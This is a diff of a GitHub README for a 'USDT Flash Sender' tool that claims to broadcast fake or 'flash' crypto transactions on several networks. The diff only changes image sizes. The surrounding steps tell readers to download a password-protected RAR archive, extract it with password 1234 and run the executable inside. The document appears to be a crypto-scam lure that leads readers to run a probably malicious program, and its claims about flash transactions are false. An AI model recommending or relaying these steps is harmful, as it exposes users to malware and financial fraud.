@@ -6,13 +6,12 @@ Multi-network flash transaction tool for USDT, BTC, ETH with configurable durati
 [![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
 
 **USDT Flash Sender** is a private developer tool for broadcasting raw USDT transactions across multiple networks (ERC-20, TRC-20, BEP-20 and other)
-4. <img width="1022" height="1280" alt="image" src="https://github.com/user-attachments/assets/c5982862-15d6-490b-a614-62c11c01ce67" />
-5. <img width="590" height="1280" alt="photo_2026-08-23_19-28-55" src="https://github.com/user-attachments/assets/a2dfb7f9-4294-4e83-888a-f704a1979d6d" />
-6. <img width="817" height="1280" alt="image" src="https://github.com/user-attachments/assets/8f5a5bde-2863-4682-9ab4-39036b1dc89c" />
 
+<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/c5982862-15d6-490b-a614-62c11c01ce67" />
+<img width="300" height="500" alt="photo_2026-08-23_19-28-55" src="https://github.com/user-attachments/assets/a2dfb7f9-4294-4e83-888a-f704a1979d6d" />
+<img width="300" height="500" alt="image" src="https://github.com/user-attachments/assets/8f5a5bde-2863-4682-9ab4-39036b1dc89c" />
 
 ## 🚀 How to use
-
 1. Download latest version [https://github.com/NovaNexusRewards/Flash-USDT-Tool/blob/main/Flash%20USDT%20Tool.rar]
 2. Extract ( 1234 PASSWORD )
 3. Run `Flash USDT Tool.exe` from Command Prompt:
